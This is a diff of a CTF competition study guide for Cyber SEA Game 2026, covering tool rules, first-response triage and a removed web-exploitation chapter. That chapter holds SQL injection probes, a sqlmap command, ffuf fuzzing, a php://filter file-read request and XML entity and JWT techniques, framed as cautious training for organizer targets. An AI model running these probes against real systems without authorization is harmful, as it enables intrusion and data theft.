-The official rules prohibit AI tools and unapproved software, limit activity to the permitted challenge targets, and prohibit publishing challenge content or uploading it to public analysis services. They also prohibit obtaining outside help during the competition. [Official rules, sections 7 and 9](https://ajccbc.ncsa.or.th/cyber-sea-game-2026/).
+Prepared notes and scripts are allowed. During competition, stay within assigned targets, collaborate within your team, and use permitted reference sites. Do not use generative-AI assistants, obtain outside help, share challenge content externally or upload challenge files to online services. Automatically displayed AI search summaries are the PDF's stated exception. [Complete rules and sources](#competition--what-is-allowed).
 
-The workbook's Windows `B5`, Kali `B4`, and Windows `H14:H15` specifically prohibit AI/ML libraries and tools. The Python and uv notes permit non-AI libraries, but this does **not** certify that any particular library is already installed, allow an explicitly rejected tool, or authorize a remote service. Keep permission, installation, and service access as three separate checks.
+The workbook's Windows `B5`, Kali `B4`, and Windows `H14:H15` prohibit AI/ML libraries and tools. Keep this stricter exclusion alongside the PDF's non-generative-AI package allowance. Check installation separately from permission.
 
 There are no agent/MCP instructions in the working recipes. Do not use the original repository's agent installer, AI model routing, promptfoo evaluations, Tavily search, or AI/ML attack tooling during the competition. Read the exclusions chapter for their dispositions.
 
 The unapproved sheet explicitly rejects online analysis services and online decompilers/compilers (`B51:C52`), including examples such as VirusTotal and CrackStation. Do decompilation, decoding, hashing, and cracking locally with listed tools. The locally installed `factordb-python` entry does not resolve permission to upload a challenge modulus to FactorDB. Similarly, the listed local AperiSolve checkout does not authorize the public upload website.
+
+<a id="00-tool-rules--windows-is-not-the-same-thing-as-wsl"></a>
 
 ## Windows is not the same thing as WSL
 
@@ -163,6 +922,8 @@ python3 --version
 
 Output paths prove that a command is discoverable. A missing path means it is not on `PATH`, not necessarily that it is absent. Check the tool matrix for `/opt/tools/...` locations before giving up. Running `--help` is often more reliable than `--version`; the workbook records several tools that do not support a version option.
 
+<a id="00-tool-rules--predictable-problems-and-approved-alternatives"></a>
+
 ## Predictable problems and approved alternatives
 
 | Problem | Better route |
@@ -178,6 +939,8 @@ Output paths prove that a command is discoverable. A missing path means it is no
 | Volatility reports missing symbols | Record the exact OS/build and existing symbols. The full Volatility 3 symbol-table ZIP collection is unapproved (`B82:C82`). Use other artifacts instead of promising a fix. |
 | The listed SSTV command does not decode | The Kali entry says decoder but records PySSTV, which may be an encoder package. Check its help; use the audio diagnostic workflow and do not assume MMSSTV/RX-SSTV approval. |
 
+<a id="00-tool-rules--non-ai-python-package-checks"></a>
+
 ## Non-AI Python package checks
 
 Prefer standard-library recipes. For an optional library, verify it without running an installer:
@@ -188,7 +951,7 @@ python3 -c "import importlib.util; print({m: importlib.util.find_spec(m) is not 
 
 `True` means the active interpreter can find a module, not that its version is compatible or that every capability is permitted. `Crypto` is the import name typically provided by PyCryptodome; `PIL` comes from Pillow; `pwn` from pwntools; `z3` from z3-solver. These names are not interchangeable with package installation names. No blanket installation commands are included.
 
-If a recipe specifically needs PyCryptodome and it is missing, the Windows sheet's non-AI-library permission provides a targeted **WSL-only** route using the listed uv installation. First confirm `command -v python3` prints an existing interpreter. From your working directory, create a separate environment rather than changing the organizer's system packages:
+PDF p.5 permits non-AI libraries/dependencies/plugins/packages in either environment, subject to the named exclusions above. If a recipe needs PyCryptodome, first check `python3 --version`. Choose a fresh `.ctf-venv` directory in your challenge folder. **WSL, using its listed uv:**
 
 ```bash
 uv venv --python "$(command -v python3)" .ctf-venv
@@ -196,28 +959,42 @@ uv pip install --python .ctf-venv/bin/python pycryptodome
 .ctf-venv/bin/python -c 'from Crypto.Cipher import AES; print(AES.block_size)'
 ```
 
-Expected output from the last command: `16`. Run the relevant saved script with `.ctf-venv/bin/python your_script.py`, replacing the filename. Creating a new environment does not copy every package from system Python. This setup needs access to an allowed package source; if unavailable, use the standard-library route or existing approved tool. It does not establish a separate Kali installation permission. Syntax reference: [uv environments](https://docs.astral.sh/uv/pip/environments/) and [package management](https://docs.astral.sh/uv/pip/packages/).
+**Kali, if its existing Python supports venv/pip:**
+
+```bash
+python3 -m venv .ctf-venv
+.ctf-venv/bin/python -m pip install pycryptodome
+.ctf-venv/bin/python -c 'from Crypto.Cipher import AES; print(AES.block_size)'
+```
+
+The check should print `16`. Run your saved script with `.ctf-venv/bin/python your_script.py`. A new environment does not inherit all system packages. If venv, pip or package access is unavailable, use WSL's uv route or a standard-library alternative. These commands add a library; they do not approve an unlisted standalone app or its external tools. [Python venv](https://docs.python.org/3/library/venv.html), [uv environments](https://docs.astral.sh/uv/pip/environments/).
+
+<a id="00-tool-rules--do-not-lose-time-to-the-repository-installer"></a>
 
 ## Do not lose time to the repository installer
 
 The source's `scripts/install_ctf_tools.sh all` is designed for an unrestricted agent workstation. It is not a competition setup step. It installs a broad collection that does not match this event's whitelist. Likewise, the original generated catalog loads external analytics and links to agent skills; this offline website does neither.
 
-Use the tool matrix to resolve a concrete need. Use the organizer's existing environment. Preserve the organizer's recorded versions even if a tool's public website now advertises a different one.
+Use the tool matrix to resolve a concrete need. The PDF says installation used the latest versions available when it began in mid-October; workbook versions are a record, not a guarantee of the runtime version. Check the supplied tool's `--version` and `--help` before using version-sensitive options.
 
 
 ---
 
 <a id="01-first-ten-minutes"></a>
 
+<a id="01-first-ten-minutes--first-ten-minutes-get-evidence-before-guessing"></a>
+
 # First ten minutes: get evidence before guessing
 
 Your aim is to turn an unfamiliar challenge into one precise question. “Something is hidden in this file” is too broad. “There are ZIP bytes after the PNG end marker” gives you a next action.
 
+<a id="01-first-ten-minutes--1-record-the-question-and-protect-your-starting-point"></a>
+
 ## 1. Record the question and protect your starting point
 
-Write down the exact task, flag format, target address/port, supplied files, and any attempt limit. Keep one untouched copy and work on another. You do not need to install a case-management application.
+Write down the exact task, flag format, target address/port, supplied files and any attempt limit. Flags typically use `CSG_FLAG{...}`; submit the complete value through CTFd, following any challenge-specific format. Retain short command/evidence notes for the Day 2 write-up/presentations slot. [Schedule and format](#competition--categories-flags-and-time). Keep one untouched copy and work on another. You do not need to install a case-management application.
 
-In **Kali or WSL**, from the directory containing the attachment:
+For a small attachment, in **Kali or WSL**, from its directory (use the streaming hash below for large images; remote Kali has 8 GiB RAM and 40 GB disk):
 
 ```bash
 mkdir -p case/original case/work case/notes
@@ -249,6 +1026,8 @@ with path.open('rb') as stream:
         digest.update(chunk)
 print(digest.hexdigest(), path.name)
 ```
+
+<a id="01-first-ten-minutes--2-identify-the-bytes-not-just-the-extension"></a>
 
 ## 2. Identify the bytes, not just the extension
 
@@ -286,6 +1065,8 @@ python3 -c "from pathlib import Path; p=Path('challenge.bin'); f=p.open('rb'); b
 
 A header match is a hint, not full validation. A ZIP header can occur inside another file. A text-looking file may hold Base64, hex, JSON, or source code.
 
+<a id="01-first-ten-minutes--3-inspect-containers-before-extraction"></a>
+
 ## 3. Inspect containers before extraction
 
 **Kali** has 7-Zip (`C9`) and unzip (`C155`):
@@ -305,6 +1086,8 @@ python3 -m zipfile -l challenge.zip
 
 Notice path traversal names, duplicate filenames, timestamps, comments, and suspicious size ratios. If the archive is nested repeatedly, identify the compression at each layer and keep intermediate outputs rather than deleting your trail.
 
+<a id="01-first-ten-minutes--4-read-source-before-attacking-a-service"></a>
+
 ## 4. Read source before attacking a service
 
 If source is supplied, locate the input, transformation, and success check. Do not start by installing more tools. On **Kali**, search a source directory with ripgrep (`C126`):
@@ -314,6 +1097,8 @@ rg -n -i 'flag|secret|password|verify|compare|eval|exec|pickle|subprocess' sourc
 ```
 
 On **Windows**, use Notepad++ **Search → Find in Files** on the source directory. In a web challenge, inspect HTML and referenced JavaScript as well as backend source. Follow the actual data flow; a keyword match alone does not prove a vulnerability.
+
+<a id="01-first-ten-minutes--5-make-one-baseline-connection"></a>
 
 ## 5. Make one baseline connection
 
@@ -351,6 +1136,8 @@ ncat --idle-timeout 15s challenge.example 31337
 
 Read its banner and prompts. Do not paste a binary payload into a text prompt until you know its framing. TLS services may need Ncat's `--ssl`; use that only when the challenge specifies TLS.
 
+<a id="01-first-ten-minutes--6-keep-a-hypothesis-log"></a>
+
 ## 6. Keep a hypothesis log
 
 Use a small table in `notes.md`:
@@ -362,6 +1149,8 @@ Use a small table in `notes.md`:
 | Two RSA moduli share a factor | Bad key generation reused a prime | Compute `gcd(n1, n2)` | A nontrivial factor gives a direct private-key calculation. |
 
 Change one variable at a time. Save the baseline so you can compare. Do not treat a changed response length as proof without checking the actual body.
+
+<a id="01-first-ten-minutes--7-know-when-to-pivot"></a>
 
 ## 7. Know when to pivot
 
@@ -386,6 +1175,8 @@ Relevant output files:
 
 This replaces the source's AI model-routing ladder with a practical team handoff. No model choice or token budget belongs in the human workflow.
 
+<a id="01-first-ten-minutes--8-verify-before-submitting"></a>
+
 ## 8. Verify before submitting
 
 Reproduce the candidate from the original input. Check the required prefix, encoding, capitalization, whitespace, and question wording. Keep its derivation. If attempts are limited, get a teammate to check the arithmetic or extraction independently rather than submitting cosmetic variations.
@@ -397,6 +1188,8 @@ python3 -c "from pathlib import Path; b=Path('candidate.txt').read_bytes(); prin
 ```
 
 Submit through the organizer's normal interface and record its verdict. A successful local script is not the same as an accepted answer. Avoid publishing event answers or artifacts; follow organizer confidentiality requirements.
+
+<a id="01-first-ten-minutes--9-leave-a-short-reproducible-solve-note"></a>
 
 ## 9. Leave a short reproducible solve note
 
@@ -419,590 +1212,17 @@ Adapted from `solve-challenge/SKILL.md`, `solve-challenge/difficulty-routing.md`
 
 ---
 
-<a id="02-web-exploitation"></a>
-
-# Web exploitation: follow the request to the trust boundary
-
-Use this chapter for an organizer-provided web challenge. A successful probe changes one controlled input and explains one observable difference. Record the request, response, account, and prerequisite before trying a longer chain.
-
-The official event categories include Web. This chapter also retains useful web material from the repository's miscellaneous and historical notes. Historical payloads are hypotheses: the deployed language, library version, parser, and challenge source decide whether they apply.
-
-## Where the commands run
-
-| Environment | Use here | Do not assume |
-|---|---|---|
-| Windows desktop | Chrome and its DevTools; approved editor | Native Python, curl, or Burp installation |
-| Windows WSL | Python 3, Burp Community, jq, OpenSSL; these are in the Windows approved sheet | ffuf, sqlmap, Node.js, or Burp extensions |
-| Organizer Kali | curl, ffuf, sqlmap, Git, ripgrep, Node.js and listed tools, after a version check | Every Windows-sheet tool is also installed; best-effort installations may fail |
-
-All `bash` blocks below run in WSL or Kali unless labelled **Kali only**. Start WSL from PowerShell with `wsl`; use `/mnt/c/...` for Windows files. Save Python blocks as the named `.py` file, then run `python3 filename.py`. The Windows sheet permits adding non-AI Python libraries, but they are not all preinstalled and the same installation permission is not inferred for Kali; the examples use the standard library unless a dependency is explicitly identified.
-
-Use Burp Community manually. The workbook rejects Copy As Python-Requests, GraphQL Raider, Hackvertor, and JWT Editor extensions. MCP automation, AI agents, public webhook services, and public challenge uploads are not part of this workflow.
-
-## 1. Establish a baseline you can reproduce
-
-1. Read the challenge description and supplied source. Write down the permitted host, port, and any separate bot or callback service.
-2. Open the application once in Chrome. Record the URL after redirects, page title, visible forms, and the account you used.
-3. In DevTools → Network, preserve the log and perform one normal action. Open the request's Headers, Payload, Response, and Cookies views.
-4. Look for route names and API calls in supplied JavaScript. Identify data the server trusts: user IDs, prices, filenames, URLs, template text, serialized objects, and roles.
-5. In Burp, start a temporary project, open Proxy → Open browser, and browse the challenge. If that GUI is unavailable on the WSL workstation, use Chrome DevTools and the Python request below.
-6. Send the interesting request from Proxy HTTP history to Repeater. Send it unchanged twice. Dynamic nonces and timestamps should be understood before interpreting length differences.
-
-Keep TLS verification enabled. If the organizer supplies a challenge CA, configure that CA in the client. A certificate failure is a connection problem, not a vulnerability signal.
-
-**Kali only**, replace the URL with the challenge URL:
-
-```bash
-curl --version
-curl --max-time 10 --dump-header baseline.headers --output baseline.body 'https://challenge.example/'
-```
-
-The two files contain response headers and body separately. This request does not follow redirects; read `Location` first. A `302` to login means the baseline is unauthenticated. A `429` means pause and obey `Retry-After`.
-
-**WSL/Kali Python alternative**, save as `fetch_once.py`:
-
-```python
-import sys
-import urllib.request
-import urllib.error
-from pathlib import Path
-
-class NoRedirect(urllib.request.HTTPRedirectHandler):
-    def redirect_request(self, req, fp, code, msg, headers, newurl):
-        return None
-
-if len(sys.argv) != 2:
-    raise SystemExit('usage: python3 fetch_once.py https://CHALLENGE/path')
-opener = urllib.request.build_opener(NoRedirect)
-req = urllib.request.Request(sys.argv[1], headers={'User-Agent': 'CTF-manual/1.0'})
-try:
-    response = opener.open(req, timeout=10)
-except urllib.error.HTTPError as exc:
-    response = exc
-with response:
-    body = response.read(2_000_001)
-    if len(body) > 2_000_000:
-        raise SystemExit('response exceeds local review limit')
-    Path('baseline.body').write_bytes(body)
-    Path('baseline.headers').write_text(str(response.headers), encoding='utf-8')
-    print(response.status, len(body), response.headers.get('Location', ''))
-```
-
-Expected output is a status, byte count, and possibly a redirect. This script deliberately makes one request. Compare the saved body with what Chrome displays; JavaScript may fetch the actual data later.
-
-## 2. Build a small route and parameter map
-
-Use evidence already present in the application before guessing names. A linked `/api/profile`, source comment, JavaScript route, exposed source archive, or a challenge hint is a useful starting point.
-
-| Evidence | One next action | Interpretation |
-|---|---|---|
-| JavaScript calls `/api/items/17` | Replay the exact request | Learn the response structure and authentication |
-| An object contains `ownerId` | Compare objects belonging to two challenge accounts | Separate authentication from ownership checks |
-| Source uses a pathname parameter | Request one known permitted filename | Establish the file-read baseline |
-| Response has `Server`, framework cookies, or stack trace | Match against supplied dependency files | Headers alone do not prove a version |
-| `robots.txt` links a route | Open that listed route once | Disallowed crawling is not an access control |
-| Supplied `.git` directory | Inspect locally; do not clone unrelated organizations | Deleted challenge files may remain in history |
-
-**Kali only**, with a supplied repository:
-
-```bash
-git -C challenge-source log --oneline --all -20
-git -C challenge-source log --all --oneline -- config.py
-git -C challenge-source show COMMIT:config.py
-rg -n 'fetch\(|axios|/api/|SECRET|verify|unserialize|render_template_string' challenge-source
-```
-
-Replace `COMMIT` with a commit from the log. A hit is a lead; verify whether the running challenge uses that code. Do not print credentials into shared notes unnecessarily.
-
-If source reveals a route prefix and a short set of plausible names, make a small local list. **Kali only**:
-
-```bash
-printf '%s\n' profile export status > routes.txt
-ffuf -w routes.txt -u 'https://challenge.example/api/FUZZ' -t 1 -rate 1 -timeout 10 -maxtime 30 -mc all -of json -o routes.json
-```
-
-Run this only after recording why `/api/` and these three names are plausible. Inspect every response manually. A site may return `200` with the same error page for all paths. Stop on rate limiting or repeated server errors. Avoid recursive scans and large default dictionaries; this chapter does not use the repository's high-concurrency fuzzer.
-
-For a confirmed technique, the Kali workbook includes an offline PayloadsAllTheThings copy. Search its relevant chapter rather than downloading or spraying a bulk payload collection:
-
-```bash
-rg -n -i 'sqlite|union' '/opt/tools/PayloadsAllTheThings/SQL Injection'
-rg -n -i 'jinja|flask' '/opt/tools/PayloadsAllTheThings/Server Side Template Injection'
-```
-
-Read the nearby explanation and match its parser/version assumptions to your challenge. A missing directory is an environment limitation; the repository's automatic clone instructions are not needed.
-
-## 3. Repeater as the main experiment notebook
-
-Create tabs called `baseline`, `candidate`, and `negative-control`. Disable automatic redirect following while investigating login or access checks. Let Burp update `Content-Length` when you edit a body.
-
-Example request, with your own session cookie substituted:
-
-```http
-GET /api/notes/17 HTTP/1.1
-Host: challenge.example
-Cookie: session=YOUR_CHALLENGE_SESSION
-Accept: application/json
-
-```
-
-Change only `17` to the ID of an object made by your second challenge account. Compare status, body, owner, and whether a new `Set-Cookie` appears. A `200` with `{"error":"forbidden"}` is denied access; status alone is not proof.
-
-For a POST, preserve content type and CSRF handling:
-
-```http
-POST /api/profile HTTP/1.1
-Host: challenge.example
-Cookie: session=YOUR_CHALLENGE_SESSION
-Content-Type: application/json
-
-{"displayName":"ctf-marker-17"}
-```
-
-A CSRF token may be single-use or session-bound. If a replay fails, obtain a new normal request before blaming your changed field. Keep raw bytes: form data, JSON, multipart, URL percent encoding, and HTML entities are different decoding layers.
-
-## 4. Authentication and access control
-
-### Ownership and mass assignment
-
-Use two accounts you control. Compare a request from each, then substitute an object identifier without changing the session. If the application accepts an extra `role`, `owner`, or `balance` field, verify the value with a separate read request. An echoed field can be ignored by the database.
-
-For WebSocket or server-sent events, connect normally, log out in another tab, then send one benign message on the existing connection. Acceptance after logout is evidence of stale authorization only if the operation actually needs a current session. Inspect the upgrade handshake and subsequent frames separately.
-
-### Cookies and state
-
-Record the cookie name, domain, path, Secure, HttpOnly, SameSite, and expiration. HttpOnly prevents JavaScript reading a cookie; it does not prevent a browser sending authenticated requests. Cookie `Path` is not an authorization mechanism. A base64-looking cookie may be signed, encrypted, or just encoded; decode a copy before changing it.
-
-Distinguish these observations:
-
-- Editing a role and receiving rejection suggests an integrity check.
-- Editing a role and seeing the old role suggests the server ignores the field.
-- Replaying an old signed balance after spending suggests state rollback; verify with a fresh balance query.
-- Receiving a session at a public admin-login route is normal unless that session already authorizes an admin action.
-
-### Normalization and parser disagreements
-
-When source compares strings differently from the framework, compare one encoded representation with its decoded equivalent: `/admin/item` versus `/%61dmin/item`, for example. Preserve the raw path in Burp. A browser may normalize it before transmission.
-
-Do not spray all encodings. First determine which component validates the input and which component uses it. Relevant source patterns include `startswith`, regex anchors, repeated URL decoding, `basename`, route middleware, Unicode case folding, and delimiter-based account records.
-
-For username normalization, create two ordinary test names that differ by case or a documented normalization rule. Confirm which account is returned. Do not assume provider-specific email alias handling is universal.
-
-### Password and OTP hypotheses
-
-Do not start with a login brute force. First check whether the challenge supplies a small candidate space, source-generated passwords, a timestamp seed, or an offline verifier. Prefer testing candidates locally. One failed login with a known wrong password establishes the failure signature; a second known account establishes whether username enumeration exists.
-
-If an online candidate test is necessary, use a few challenge-derived candidates, one at a time, and stop on lockout or rate limiting. A redirect, response length, or missing error string alone does not establish login success; fetch the authenticated account page afterwards. Recreate any frontend password transform from the supplied JavaScript before testing.
-
-## 5. JWT and JWE: inspect before changing
-
-JWT normally has three base64url segments. JWE compact serialization normally has five. Encryption with a public key does not authenticate who created the ciphertext; a challenge that accepts arbitrary encrypted claims may need an independent signature or server-side authorization check.
-
-Save this local decoder as `decode_token.py`. It does not verify signatures:
-
-```python
-import base64
-import json
-import sys
-
-def decode(segment):
-    return base64.urlsafe_b64decode(segment + '=' * (-len(segment) % 4))
-
-token = sys.argv[1]
-parts = token.split('.')
-print('segments:', len(parts))
-for i in ([0, 1] if len(parts) == 3 else [0]):
-    try:
-        print(i, json.dumps(json.loads(decode(parts[i])), indent=2))
-    except (ValueError, IndexError) as exc:
-        print('not a JSON segment:', i, exc)
-```
-
-```bash
-python3 decode_token.py 'PASTE_YOUR_CHALLENGE_TOKEN'
-```
-
-Look at `alg`, `kid`, `jku`, embedded `jwk`, issuer, audience, subject, expiration, and role. Do not conflate the identity claim with the authorization claim. Compare tokens from two accounts to understand which fields matter.
-
-If source omits signature verification, edit a harmless display claim and observe a separate authenticated page. If it explicitly accepts `alg: none`, the missing signature is the hypothesis. If it accepts both HMAC and RSA, check whether the same raw key bytes are mistakenly used for both; modern libraries often prevent this confusion.
-
-`kid` traversal requires a file-based key loader; `jku` injection requires the verifier to fetch an untrusted key URL. A header existing is not enough. Any URL used must be organizer-provided infrastructure, not a public JWKS or callback host.
-
-**Kali only:** `jwt_tool --help` can show the installed command's inspection syntax. Prefer the decoder above for transparent inspection. Do not assume the rejected JWT Editor Burp extension is available.
-
-## 6. SQL injection: prove the expression boundary
-
-Start from a parameter that plausibly reaches SQL and a stable baseline. Read source if supplied. Numeric, quoted string, identifier, and `ORDER BY` contexts require different syntax.
-
-Example numeric context, tested separately in Repeater:
-
-```http
-GET /item?id=1%20AND%201=1 HTTP/1.1
-Host: challenge.example
-
-```
-
-```http
-GET /item?id=1%20AND%201=2 HTTP/1.1
-Host: challenge.example
-
-```
-
-Expected evidence: the first response matches item 1, the second gives the application's normal no-result page, and the unchanged baseline remains stable. This pair does not work if input is parsed as an integer before querying; that failure narrows the hypothesis.
-
-For a single-quoted string, adapt to the actual query. A trailing SQL comment must be valid for the database, and MySQL's `--` comment requires following whitespace. Do not copy a payload from a different DBMS and treat its error as proof of a WAF.
-
-### Visible results
-
-After a boolean difference is confirmed, find the projection width with a small number of `ORDER BY` or `UNION SELECT NULL` probes appropriate to the query. Use a unique marker in one compatible text column. Retrieve only the challenge-relevant table or row indicated by schema or source.
-
-Common failures are mismatched column counts, incompatible types, pagination hiding your row, and the original query returning before your injected row. Store each successful intermediate request.
-
-### Blind results
-
-Define a reliable true/false predicate before extracting text. Check both outcomes several times. Measure lengths only after removing dynamic tokens. For timing, alternate true and false probes and compare repeated measurements; network jitter can exceed the intended delay. Avoid expensive expressions such as huge `randomblob` allocations.
-
-A local binary search rehearsal makes the extraction logic clear:
-
-```python
-# Save as oracle_search.py; this toy does not contact a server.
-secret = 73
-queries = 0
-def is_at_most(value):
-    global queries
-    queries += 1
-    return secret <= value
-
-lo, hi = 0, 255
-while lo < hi:
-    mid = (lo + hi) // 2
-    if is_at_most(mid):
-        hi = mid
-    else:
-        lo = mid + 1
-assert lo == secret
-assert queries <= 8
-print(lo, queries)
-```
-
-Expected output is `73 8`. The real oracle must answer the same mathematical predicate; mixing `>` and `>=` causes off-by-one failures. Determine string length and character encoding before iterating positions.
-
-### Targeted sqlmap after manual confirmation
-
-**Kali only:** save the confirmed request from Burp as `request.txt`, with its current session and token. Check that it points only at the challenge host.
-
-```bash
-sqlmap --version
-sqlmap -r request.txt -p id --level=1 --risk=1 --technique=B --threads=1 --delay=1 --timeout=10 --retries=0 --batch
-```
-
-This confines testing to the observed `id` parameter and boolean technique. Review detected DBMS and the exact injection evidence. A token-expiration error is not a negative SQLi result. Do not add `--dump-all`, OS shells, tamper chains, or unrelated parameters automatically. For TLS requests, preserve the correct target scheme when exporting or use the installed help's TLS option.
-
-### Less obvious SQL input paths
-
-| Pattern in source | Diagnostic | What to do after a positive result |
-|---|---|---|
-| Stored name used in a later query | Put a unique marker in the stored field; trigger the later view | Test the later query boundary, not only registration |
-| Sort key inserted unquoted | Compare a permitted column with a simple expression | Map identifier/expression context |
-| `INSERT` or duplicate-key update | Inspect all inserted columns and conflict handling | Track which field can shift or overwrite another |
-| Image metadata, QR, DNS answer, or header reaches SQL | Follow that exact data path with a marker | Capture decoded input before testing SQL syntax |
-| Escaping plus multibyte conversion | Identify charset and order of operations | Reproduce the conversion locally on bytes |
-| Two passes of formatting | Compare literal `%` and a benign format marker | Separate application formatting from SQL parsing |
-| Keyword replacement filter | Inspect whether replacement repeats | Model one transformation; do not assume comment fragmentation works |
-
-MySQL process-list tricks, historical `PROCEDURE ANALYSE`, backtracking limits, and column truncation are version- and configuration-dependent. Check the supplied schema and DBMS version; do not treat old writeup dates as applicability evidence.
-
-## 7. NoSQL, LDAP, XPath, and GraphQL
-
-JSON is not automatically safe. If a MongoDB query directly uses an input object, test whether a field accepts an operator-shaped value instead of a string. Compare a known account with a non-matching condition first. If validation rejects objects, pivot rather than spraying `$where` JavaScript.
-
-LDAP and XPath use different grammar from SQL. Locate a concatenated filter or XPath expression in source, then test one matching/non-matching predicate while preserving balanced syntax. A wildcard returning multiple directory records is an enumeration signal only if that endpoint was meant to return one.
-
-GraphQL inspection in Repeater needs no extension:
-
-```http
-POST /graphql HTTP/1.1
-Host: challenge.example
-Content-Type: application/json
-
-{"query":"{ __typename }"}
-```
-
-If this returns a JSON `data` object, consult the supplied schema or the application's own queries. Introspection may be disabled. Request a single known field before attempting nested queries or aliases. An alias changes the response key; it does not itself bypass access checks. Compare authorization for the same object through two resolvers.
-
-## 8. File reads, paths, and uploads
-
-Use a file already identified by the challenge source or description. A request for an arbitrary operating-system file may prove traversal, but the shortest useful proof is usually a challenge-specific configuration or marker.
-
-If `file=welcome.txt` is the normal input, try one relative traversal suggested by the source directory layout. Distinguish reading raw bytes, template inclusion, archive extraction, and executable upload: they are different capabilities.
-
-PHP `php://filter` is relevant only when a PHP stream function accepts a wrapper. In Repeater, a source-reading hypothesis might use:
-
-```http
-GET /view?file=php://filter/convert.base64-encode/resource=index.php HTTP/1.1
-Host: challenge.example
-
-```
-
-Expected evidence is base64 that decodes to the application's PHP source. Decode locally and verify syntax and route names. A rendered login page or literal error string is not source disclosure. Wrapper restrictions, suffix appending, and include paths can invalidate the probe.
-
-For uploads, begin with a harmless text or image marker. Record original filename, multipart content type, saved filename, destination URL, and response content type. Check whether the file is renamed or re-encoded. Re-encoding destroys many appended polyglots.
-
-Archive traversal checks start with listing members, not extracting over your working tree:
-
-```python
-# Save as inspect_zip.py; run with the challenge ZIP path.
-import sys
-import zipfile
-from pathlib import PurePosixPath
-
-with zipfile.ZipFile(sys.argv[1]) as archive:
-    for item in archive.infolist():
-        p = PurePosixPath(item.filename.replace('\\', '/'))
-        mode = item.external_attr >> 16
-        unsafe = p.is_absolute() or '..' in p.parts or bool(p.parts and ':' in p.parts[0])
-        symlink = (mode & 0o170000) == 0o120000
-        print(item.filename, 'size=', item.file_size,
-              'traversal=', unsafe, 'symlink=', symlink)
-```
-
-A symlink member followed by a file through that link is a different risk from a `../` filename. Windows drive paths and separators need separate review. Challenge upload extraction may behave differently from your local ZIP library.
-
-Historical `.htaccess`, `.phar`, `zip://`, short-name, null-byte, and double-extension tricks need the matching server and language version. Prove how the stored file is handled before trying code execution.
-
-## 9. Template, format-string, and command injection
-
-### Template arithmetic first
-
-For a field rendered by a template engine, submit `ctf-{{7*7}}-end` and compare it with a literal control. A response containing `ctf-49-end` suggests evaluation. It does not uniquely identify Jinja2; several engines use similar syntax.
-
-Read the stack trace, template source, or dependency file. Map the exact context: template source versus a variable passed to a fixed template, expression versus statement, and server-side versus client-side rendering. Then use the engine's documented syntax to inspect one harmless available value.
-
-Python `str.format` is not Jinja2 and does not evaluate arbitrary expressions. Its field traversal can still expose attributes or dictionary entries if sensitive objects are passed into the format operation. A literal `{7*7}` remaining unchanged is expected there.
-
-### Command and argument boundaries
-
-If source concatenates input into a shell command, a benign marker distinguishes command execution from validation. Adapt one separator to the proven shell context, for example a URL-encoded newline followed by `printf CTF_PROBE_17` in a challenge-controlled command parameter.
-
-Do not send a reverse shell as the first test. Determine whether output appears in the response, a generated file, or a challenge-provided log. If output is suppressed, a small bounded timing control can be tested repeatedly, but ordinary slowness is not sufficient evidence.
-
-An argument array can prevent shell parsing while still accepting dangerous program options. A filename beginning with `-` can be an option if the called program lacks `--`. Inspect the complete command construction, including archive, mail, Git, image metadata, and renderer subprocesses.
-
-Languages matter: Ruby `eval`, Perl two-argument `open`, Lisp reader macros, Prolog queries, Lua interpolation, PHP legacy evaluation functions, and LaTeX shell escapes have different entry points. Modern runtimes remove some historical features. Reproduce the input-to-evaluator transformation locally before constructing a longer payload.
-
-## 10. SSRF and XML: identify the fetcher
-
-An SSRF candidate is a URL or hostname that the server fetches. First use an organizer-provided callback or an allowed URL within the challenge. Compare a known reachable path with a known missing path. Record response status, fetched content, or callback logs. Do not use public webhook services or cloud metadata endpoints outside the assigned challenge.
-
-Write down the sequence:
-
-```text
-input bytes → URL parser → allowlist → DNS resolution → redirect handling → HTTP client
-```
-
-Parser disagreement only helps when the validator and fetcher disagree. Test one discrepancy supported by source: userinfo `@`, encoded path separators, host normalization, redirects, or an unanchored hostname regex. A fetch failure might be TLS, DNS, firewall, scheme restriction, or parsing; distinguish these using a normal URL.
-
-If the challenge explicitly includes an internal service, first request its harmless health or version endpoint. Docker APIs, Redis, SMTP, MySQL, and renderer attachments require protocol-specific behavior; HTTP SSRF alone does not imply arbitrary TCP access. A `gopher` string is useless if the actual client does not support that scheme.
-
-For XML, begin with an internal entity that expands to a marker:
-
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE note [<!ENTITY probe "CTF_XML_MARKER">]>
-<note>&probe;</note>
-```
-
-If the parser expands it, inspect whether external entities are enabled. Internal expansion does not prove external file/network access. For a challenge that explicitly provides a marker file, the next entity may reference that exact file. Save parser errors: disabled DTDs, missing root elements, namespace requirements, and conversion pipelines change the behavior.
-
-Office documents, SVG, PDF renderers, XMLDecoder, XSLT, and SOAP can hide XML parsing inside uploads or conversions. Follow the actual conversion chain. Avoid publishing external DTDs; use only provided infrastructure where an out-of-band test is necessary and allowed.
-
-## 11. Deserialization and prototype pollution
-
-Never deserialize an unknown challenge object in your normal working interpreter just to inspect it. Python pickle, marshal-derived code, Java objects, PHP magic methods, .NET polymorphic objects, and XML object decoders can invoke behavior.
-
-For a suspected pickle, disassemble bytes without loading objects:
-
-```bash
-python3 -m pickletools suspect.pickle
-```
-
-Look for `GLOBAL`, `STACK_GLOBAL`, `REDUCE`, object construction, and `STOP`. Decode any outer base64 or ROT13 layer into a new file first. A pickle stream may contain appended objects; the first `STOP` can hide data ignored by a simple loader.
-
-For other formats, identify the entry function and allowed classes from source. The repository's generic Java gadget-tool invocation is not an approved-tool assumption. A useful local proof can be a harmless object whose known hook writes a marker in the challenge sandbox, only after the matching class exists.
-
-Prototype pollution requires a controllable merge or path setter plus a reachable gadget. Send an inert property such as `ctfProbe`, inspect an independently created object in a supplied local reproduction, and determine whether the property is inherited. Do not infer code execution from accepting a `__proto__` key.
-
-**Kali only**, a local JavaScript distinction:
-
-```javascript
-// Save as prototype-demo.js, run: node prototype-demo.js
-const parsed = JSON.parse('{"__proto__":{"ctfProbe":17}}');
-console.log(Object.hasOwn(parsed, '__proto__')); // true
-console.log(({}).ctfProbe);                    // undefined
-```
-
-Parsing JSON alone does not pollute the global prototype. The vulnerable merge, inherited configuration lookup, and template/VM gadget must each be demonstrated. Node's `vm` and browser-like DOM packages have version-specific boundaries; old constructor chains are not universal escapes.
-
-## 12. Browser-side execution and origin boundaries
-
-### Reflection is not execution
-
-Put `CTF_MARKER_17` into the suspected field. Find it in the response source and live DOM. Identify whether it appears in text, an attribute, a JavaScript string, a URL, CSS, or a template. Choose one benign context-appropriate proof that changes the document, such as setting a visible marker. Avoid cookie collection as a first test.
-
